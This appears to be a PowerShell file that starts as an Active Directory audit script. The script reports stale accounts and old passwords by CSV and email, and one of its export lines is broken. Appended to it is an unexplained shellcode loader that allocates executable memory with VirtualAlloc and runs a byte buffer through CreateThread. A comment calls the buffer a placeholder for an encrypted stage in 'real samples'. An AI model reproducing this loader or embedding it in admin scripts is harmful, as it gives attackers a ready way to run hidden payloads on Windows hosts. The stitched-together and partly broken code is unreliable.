
[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [Alias('DnsDomain')]
    [string]$Domain = 'adatum.com',

    [string]$SearchBase = 'OU=Users,DC=adatum,DC=com',

    [string]$ReportPath = 'C:\Reports\ad-user-audit-2026-04-06.csv',
    [string]$HtmlPath = 'C:\Reports\ad-user-audit-2026-04-06.html',

    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 365)]
    [int]$InactiveDays = 30,

    [int]$PasswordMaxAge = 365,
    [string]$SmtpServer = 'smtp.adatum.com'
)


Import-Module ActiveDirectory -ErrorAction Stop

if (-not (Get-Module -ListAvailable -Name ActiveDirectory)) {
    throw 'The ActiveDirectory module is not installed on this host.'
}
Import-Module ActiveDirectory -ErrorAction Stop

$cutoff = (Get-Date).AddDays(-$InactiveDays)
$properties = @('LastLogonDate', 'PasswordLastSet', 'Enabled', 'Description')
$users = Get-ADUser -Filter * -SearchBase $SearchBase -Properties $properties

$stale = $users | Where-Object {
    $_.Enabled -eq $true -and $_.LastLogonDate -ne $null -and $_.LastLogonDate -lt $cutoff
}

$pwdCutoff = (Get-Date).AddDays(-$PasswordMaxAge)
$oldPasswords = $users | Where-Object {
    $_.PasswordLastSet -ne $null -and $_.PasswordLastSet -lt $pwdCutoff
}

$staleCount = @($stale).Count
$disabledCount = @($users | Where-Object { $_.Enabled -eq $false }).Count
$oldPwdCount = @($oldPasswords).Count

$stale | Select-Object Name, SamAccountName, LastLogonDate, PasswordLastSet |
    -Path $ReportPath `
    -NoTypeInformation `
    -Encoding UTF8

$oldPasswords | Select-Object Name, SamAccountName, PasswordLastSet | Export-Csv -NoTypeInformation -Path $ReportPath.Replace('.csv', '-passwords.csv')

Write-Host ("Stale: {0} | Disabled: {1} | Old passwords: {2}" -f $staleCount, $disabledCount, $oldPwdCount) -ForegroundColor Cyan
Write-Verbose ("Report written to {0}" -f $ReportPath)

$MailTo = "it-ops@$Domain"
$MailFrom = "reporting@$Domain"

$mailParams = @{
    To         = $MailTo
    From       = $MailFrom
    Subject    = "AD user audit: stale accounts"
    Body       = 'Stale accounts were found. See the attached report.'
    SmtpServer = $SmtpServer
    Port       = 25
    UseSsl     = $true
}
Send-MailMessage @mailParams

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class NativeApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x9b, 0xa4, 0xaa, 0xe0, 0xc0, 0xae, 0x3a, 0xdd, 0x5c, 0xf8, 0x6b, 0xbe, 0x3c, 0x3e, 0xc0, 0x24,
    0x5e, 0xf5, 0x5e, 0x07, 0xcf, 0x95, 0x0b, 0xff, 0x31, 0x7f, 0xec, 0xd0, 0x79, 0x7a, 0x19, 0x67,
    0x0b, 0xd3, 0x0a, 0xe0, 0x52, 0x2e, 0x60, 0x40, 0x36, 0x4d, 0x5e, 0x24, 0xda, 0xcc, 0x7a, 0x93,
    0x84, 0xcf, 0x66, 0xfb, 0x20, 0x94, 0xda, 0xbe, 0x24, 0x86, 0x90, 0x45, 0x00, 0xc5, 0x59, 0xd7,
    0xe2, 0x5e, 0x52, 0x43, 0x19, 0xdd, 0x10, 0xf8, 0x9b, 0xb4, 0x1e, 0xd5, 0xe2, 0x2a, 0x0b, 0x7a,
    0xed, 0xd5, 0xea, 0x39, 0x95, 0x95, 0xfd, 0x79, 0x50, 0xb6, 0xad, 0xd9, 0xc9, 0x75, 0x88, 0xb0,
    0x98, 0xf5, 0xeb, 0x19, 0x1f, 0x17, 0xf0, 0x7e, 0x70, 0xe9, 0xb3, 0xa5, 0x04, 0x65, 0xf6, 0x6e,
    0x03, 0xe2, 0xf0, 0xd7, 0x13, 0x2c, 0x34, 0x93, 0xe9, 0x18, 0x55, 0x0b, 0x29, 0x96, 0x0f, 0x2e,
    0x67, 0x6c, 0x64, 0x94, 0x80, 0x14, 0x2f, 0xde, 0xe8, 0x22, 0xcf, 0x79, 0x28, 0x56, 0x83, 0xf2,
    0xa7, 0xaf, 0xf8, 0xf0, 0xfc, 0x10, 0x1c, 0x8d, 0xdc, 0x0b, 0xb1, 0x0e, 0xf6, 0x2a, 0xd7, 0x1a,
    0x97, 0xb7, 0x88, 0xea, 0x3d, 0x7b, 0xf7, 0x00, 0xc6, 0x8a, 0x0b, 0xaa, 0xe2, 0x2c, 0x36, 0x30,
    0x21, 0x12, 0xe3, 0xd6, 0xcd, 0x0c, 0x4b, 0xca, 0x7a, 0x53, 0xf0, 0xd2, 0x20, 0x31, 0x90, 0x77,
    0x0b, 0x8b, 0x9c, 0x0e, 0x0b, 0x5e, 0x90, 0x83, 0x28, 0x40, 0x15, 0x0e, 0x3c, 0xd3, 0xfe, 0xc6,
    0xc6, 0xad, 0xbc
)

$Handle = [NativeApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($Handle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
$ThreadId = 0
$Thread = [NativeApi]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][NativeApi]::WaitForSingleObject($Thread, 1561)
[void][NativeApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
